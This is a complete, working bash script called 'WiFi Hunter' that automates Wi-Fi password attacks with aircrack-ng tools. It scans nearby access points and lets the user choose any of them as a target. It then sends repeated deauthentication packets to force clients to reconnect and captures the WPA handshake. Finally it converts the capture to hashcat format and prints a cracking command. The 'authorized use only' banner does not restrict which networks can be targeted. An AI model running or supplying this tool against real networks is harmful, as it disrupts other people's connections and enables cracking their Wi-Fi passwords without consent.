#!/bin/bash
# WiFi Hunter - Interactive Handshake Capture Tool
# For authorized testing of YOUR OWN networks only
#
# Features:
# - Scans and displays all nearby APs with channels
# - Interactive AP selection
# - Attack mode with automatic deauth
# - Real-time handshake monitoring
# - Automatic hashcat conversion

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Global variables
MONITOR_INTERFACE=""
SCAN_FILE="/tmp/wifi_scan_$$"
CAPTURE_FILE=""
DEAUTH_PID=""
AIRODUMP_PID=""

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"

    # Kill background processes
    if [ ! -z "$DEAUTH_PID" ]; then
        kill $DEAUTH_PID 2>/dev/null || true
    fi
    if [ ! -z "$AIRODUMP_PID" ]; then
        kill $AIRODUMP_PID 2>/dev/null || true
    fi

    # Remove temp files
    rm -f ${SCAN_FILE}* 2>/dev/null || true

    # Disable monitor mode
    if [ ! -z "$MONITOR_INTERFACE" ]; then
        echo -e "${BLUE}[*] Disabling monitor mode...${NC}"
        airmon-ng stop $MONITOR_INTERFACE 2>/dev/null || true
        systemctl restart NetworkManager 2>/dev/null || true
    fi

    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

# Trap Ctrl+C and errors
trap cleanup EXIT INT TERM

# Banner
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                                                              ║"
    echo "║                      WiFi Hunter v1.0                        ║"
    echo "║              Handshake Capture & Deauth Tool                 ║"
    echo "║                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${RED}${BOLD}⚠️  LEGAL WARNING ⚠️${NC}"
    echo -e "${YELLOW}Only use on networks YOU OWN or have explicit authorization!${NC}"
    echo -e "${YELLOW}Unauthorized access is ILLEGAL.${NC}"
    echo ""
}

# Check if root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[-] Error: This script must be run as root${NC}"
        echo -e "${YELLOW}Usage: sudo $0${NC}"
        exit 1
    fi
}

# Check dependencies
check_dependencies() {
    local missing=""

    for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
        if ! command -v $cmd &> /dev/null; then
            missing="$missing $cmd"
        fi
    done

    if [ ! -z "$missing" ]; then
        echo -e "${RED}[-] Missing dependencies:$missing${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt install aircrack-ng${NC}"
        exit 1
    fi
}

# Get wireless interface
get_interface() {
    echo -e "${BLUE}[*] Detecting wireless interfaces...${NC}"
    echo ""

    # List interfaces
    local interfaces=$(iwconfig 2>/dev/null | grep -o "^[a-z0-9]*" | grep -v "lo\|eth")

    if [ -z "$interfaces" ]; then
        echo -e "${RED}[-] No wireless interfaces found!${NC}"
        exit 1
    fi

    # Display interfaces
    echo -e "${GREEN}Available wireless interfaces:${NC}"
    local i=1
    local interface_array=()
    for iface in $interfaces; do
        interface_array+=("$iface")
        echo -e "  ${CYAN}[$i]${NC} $iface"
        ((i++))
    done

    echo ""
    read -p "Select interface [1]: " choice
    choice=${choice:-1}

    # Validate choice
    if [ $choice -lt 1 ] || [ $choice -gt ${#interface_array[@]} ]; then
        echo -e "${RED}[-] Invalid choice${NC}"
        exit 1
    fi

    INTERFACE="${interface_array[$((choice-1))]}"
    echo -e "${GREEN}[+] Selected: $INTERFACE${NC}"
}

# Enable monitor mode
enable_monitor_mode() {
    echo ""
    echo -e "${BLUE}[*] Enabling monitor mode on $INTERFACE...${NC}"

    # Kill interfering processes
    echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
    airmon-ng check kill > /dev/null 2>&1

    # Enable monitor mode
    airmon-ng start $INTERFACE > /dev/null 2>&1

    # Get monitor interface name
    MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')

    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[-] Failed to enable monitor mode${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Monitor mode enabled: $MONITOR_INTERFACE${NC}"
    sleep 2
}

# Scan for APs
scan_aps() {
    echo ""
    echo -e "${BLUE}[*] Scanning for access points...${NC}"
    echo -e "${YELLOW}[*] Scanning for 15 seconds, please wait...${NC}"

    # Start airodump-ng in background
    airodump-ng $MONITOR_INTERFACE -w $SCAN_FILE --output-format csv > /dev/null 2>&1 &
    local scan_pid=$!

    # Progress bar
    for i in {1..15}; do
        echo -ne "\r${CYAN}[*] Progress: [$i/15] $(printf '#%.0s' $(seq 1 $i))${NC}"
        sleep 1
    done
    echo ""

    # Kill scan
    kill $scan_pid 2>/dev/null || true
    sleep 1

    # Check if scan file exists
    if [ ! -f "${SCAN_FILE}-01.csv" ]; then
        echo -e "${RED}[-] Scan failed - no data captured${NC}"
        exit 1
    fi
}

# Parse and display APs
display_aps() {
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║                        Discovered Access Points                             ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Parse CSV and display
    local line_num=1
    declare -g -A ap_bssid
    declare -g -A ap_channel
    declare -g -A ap_essid
    declare -g -A ap_power
    declare -g -A ap_enc

    # Header
    printf "${CYAN}%-4s %-19s %-4s %-6s %-6s %-32s${NC}\n" "NUM" "BSSID" "CH" "PWR" "ENC" "ESSID"
    echo -e "${BLUE}$(printf '─%.0s' {1..80})${NC}"

    # Skip header lines and parse APs
    local index=1
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        # Skip if bssid is empty or header
        if [[ "$bssid" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
            # Clean up fields
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            power=$(echo "$power" | xargs)
            essid=$(echo "$essid" | xargs)
            privacy=$(echo "$privacy" | xargs)

            # Skip if no ESSID
            if [ -z "$essid" ]; then
                essid="<hidden>"
            fi

            # Store AP info
            ap_bssid[$index]="$bssid"
            ap_channel[$index]="$channel"
            ap_essid[$index]="$essid"
            ap_power[$index]="$power"
            ap_enc[$index]="$privacy"

            # Color code by signal strength
            local color=$RED
            if [ ! -z "$power" ] && [ "$power" -gt -70 ]; then
                color=$GREEN
            elif [ ! -z "$power" ] && [ "$power" -gt -80 ]; then
                color=$YELLOW
            fi

            # Display AP
            printf "${color}%-4s${NC} %-19s %-4s %-6s %-6s %-32s\n" \
                "[$index]" "$bssid" "$channel" "$power" "$privacy" "${essid:0:32}"

            ((index++))
        fi
    done < <(tail -n +2 "${SCAN_FILE}-01.csv" | grep -E "^[0-9A-Fa-f:]{17}")

    # Store total count
    TOTAL_APS=$((index-1))

    echo ""
    echo -e "${GREEN}[+] Found $TOTAL_APS access points${NC}"

    if [ $TOTAL_APS -eq 0 ]; then
        echo -e "${RED}[-] No access points found. Try scanning again.${NC}"
        exit 1
    fi
}

# Select target AP
select_target() {
    echo ""
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                    Select Target Network                     ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    read -p "Enter target number [1]: " target_num
    target_num=${target_num:-1}

    # Validate selection
    if [ $target_num -lt 1 ] || [ $target_num -gt $TOTAL_APS ]; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi

    # Get target info
    TARGET_BSSID="${ap_bssid[$target_num]}"
    TARGET_CHANNEL="${ap_channel[$target_num]}"
    TARGET_ESSID="${ap_essid[$target_num]}"
    TARGET_POWER="${ap_power[$target_num]}"
    TARGET_ENC="${ap_enc[$target_num]}"

    # Display target info
    echo ""
    echo -e "${GREEN}╔═══════════════════ Target Selected ════════════════════╗${NC}"
    echo -e "${GREEN}║${NC} ESSID   : ${YELLOW}$TARGET_ESSID${NC}"
    echo -e "${GREEN}║${NC} BSSID   : ${YELLOW}$TARGET_BSSID${NC}"
    echo -e "${GREEN}║${NC} Channel : ${YELLOW}$TARGET_CHANNEL${NC}"
    echo -e "${GREEN}║${NC} Power   : ${YELLOW}$TARGET_POWER dBm${NC}"
    echo -e "${GREEN}║${NC} Encrypt : ${YELLOW}$TARGET_ENC${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
}

# Ask for attack mode
ask_attack_mode() {
    echo ""
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                      Attack Mode                             ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Attack mode will automatically send deauth packets to force handshakes.${NC}"
    echo -e "${YELLOW}This disconnects clients briefly, causing them to reconnect.${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC} Enable attack mode (deauth every 5 seconds)"
    echo -e "  ${GREEN}[2]${NC} Passive mode (wait for natural handshakes)"
    echo ""

    read -p "Select mode [1]: " attack_choice
    attack_choice=${attack_choice:-1}

    if [ "$attack_choice" = "1" ]; then
        ATTACK_MODE=true
        echo -e "${GREEN}[+] Attack mode enabled${NC}"
    else
        ATTACK_MODE=false
        echo -e "${BLUE}[+] Passive mode enabled${NC}"
    fi
}

# Start deauth attack in background
start_deauth_attack() {
    echo -e "${YELLOW}[*] Starting deauth attack...${NC}"

    # Deauth loop in background
    (
        while true; do
            aireplay-ng --deauth 5 -a $TARGET_BSSID $MONITOR_INTERFACE > /dev/null 2>&1
            sleep 5
        done
    ) &

    DEAUTH_PID=$!
    echo -e "${GREEN}[+] Deauth attack running (PID: $DEAUTH_PID)${NC}"
}

# Check for handshake
check_handshake() {
    local capfile=$1

    if [ ! -f "$capfile" ]; then
        return 1
    fi

    # Check with aircrack-ng
    local result=$(aircrack-ng "$capfile" 2>/dev/null | grep -c "1 handshake" || echo "0")

    if [ "$result" -gt 0 ]; then
        return 0
    else
        return 1
    fi
}

# Monitor capture for handshake
monitor_handshake() {
    local capfile="${CAPTURE_FILE}-01.cap"
    local start_time=$(date +%s)

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              Monitoring for Handshake...                     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Press Ctrl+C to stop capture${NC}"
    echo ""

    local check_count=0
    while true; do
        sleep 5
        ((check_count++))

        local elapsed=$(($(date +%s) - start_time))
        echo -ne "\r${BLUE}[*] Elapsed: ${elapsed}s | Checks: $check_count | Status: ${YELLOW}Waiting...${NC}     "

        # Check for handshake every 5 seconds
        if [ -f "$capfile" ]; then
            if check_handshake "$capfile"; then
                echo -ne "\r${GREEN}[+] Elapsed: ${elapsed}s | Checks: $check_count | Status: ${GREEN}${BOLD}HANDSHAKE CAPTURED!${NC}     \n"
                echo ""
                echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
                echo -e "${GREEN}${BOLD}║                  🎉 HANDSHAKE CAPTURED! 🎉                   ║${NC}"
                echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"

                # Kill deauth if running
                if [ ! -z "$DEAUTH_PID" ]; then
                    kill $DEAUTH_PID 2>/dev/null || true
                    DEAUTH_PID=""
                fi

                # Kill airodump if running
                if [ ! -z "$AIRODUMP_PID" ]; then
                    kill $AIRODUMP_PID 2>/dev/null || true
                    AIRODUMP_PID=""
                fi

                sleep 2
                return 0
            fi
        fi
    done
}

# Start capture
start_capture() {
    # Generate capture filename
    local timestamp=$(date +%Y%m%d_%H%M%S)
    CAPTURE_FILE="handshake_${TARGET_ESSID// /_}_${timestamp}"

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                  Starting Capture                            ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}[*] Target   : ${YELLOW}$TARGET_ESSID ($TARGET_BSSID)${NC}"
    echo -e "${BLUE}[*] Channel  : ${YELLOW}$TARGET_CHANNEL${NC}"
    echo -e "${BLUE}[*] Output   : ${YELLOW}${CAPTURE_FILE}-01.cap${NC}"
    echo -e "${BLUE}[*] Mode     : ${YELLOW}$([ "$ATTACK_MODE" = true ] && echo "Attack (Deauth)" || echo "Passive")${NC}"
    echo ""

    # Start airodump-ng in background
    airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $CAPTURE_FILE $MONITOR_INTERFACE > /dev/null 2>&1 &
    AIRODUMP_PID=$!

    echo -e "${GREEN}[+] Capture started (PID: $AIRODUMP_PID)${NC}"

    sleep 2

    # Start deauth if attack mode enabled
    if [ "$ATTACK_MODE" = true ]; then
        start_deauth_attack
    fi

    # Monitor for handshake
    monitor_handshake
}

# Process captured handshake
process_handshake() {
    local capfile="${CAPTURE_FILE}-01.cap"

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              Processing Captured Handshake                   ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Verify handshake
    echo -e "${BLUE}[*] Verifying handshake...${NC}"
    aircrack-ng "$capfile" 2>/dev/null | grep --color=never "WPA\|handshake"

    echo ""
    echo -e "${GREEN}[+] Handshake verified!${NC}"

    # Convert to hashcat format
    echo ""
    read -p "Convert to hashcat format? (y/n) [y]: " convert_choice
    convert_choice=${convert_choice:-y}

    if [[ "$convert_choice" =~ ^[Yy]$ ]]; then
        local hc_file="${CAPTURE_FILE}.hc22000"

        if command -v hcxpcapngtool &> /dev/null; then
            echo -e "${BLUE}[*] Converting with hcxpcapngtool...${NC}"
            hcxpcapngtool -o "$hc_file" "$capfile" 2>/dev/null
            echo -e "${GREEN}[+] Converted: $hc_file${NC}"
            echo ""
            echo -e "${YELLOW}Crack with:${NC}"
            echo -e "${CYAN}  hashcat -m 22000 $hc_file wordlist.txt${NC}"
        else
            echo -e "${YELLOW}[!] hcxpcapngtool not found${NC}"
            echo -e "${BLUE}[*] Install with: sudo apt install hcxtools${NC}"
            echo ""
            echo -e "${YELLOW}Alternative: Upload to https://hashcat.net/cap2hashcat/${NC}"
        fi
    fi

    # Show file location
    echo ""
    echo -e "${GREEN}╔═══════════════════ Files Created ══════════════════════╗${NC}"
    echo -e "${GREEN}║${NC} Capture file : ${YELLOW}$(pwd)/${capfile}${NC}"
    if [ -f "${CAPTURE_FILE}.hc22000" ]; then
        echo -e "${GREEN}║${NC} Hashcat file : ${YELLOW}$(pwd)/${CAPTURE_FILE}.hc22000${NC}"
    fi
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
}

# Main function
main() {
    show_banner
    check_root
    check_dependencies

    # Get interface
    get_interface

    # Enable monitor mode
    enable_monitor_mode

    # Scan for APs
    scan_aps

    # Display APs
    display_aps

    # Select target
    select_target

    # Ask for attack mode
    ask_attack_mode

    # Start capture
    start_capture

    # Process handshake
    process_handshake

    echo ""
    echo -e "${GREEN}${BOLD}[+] All done! Happy cracking! 🔓${NC}"
    echo ""
}

# Run main
main
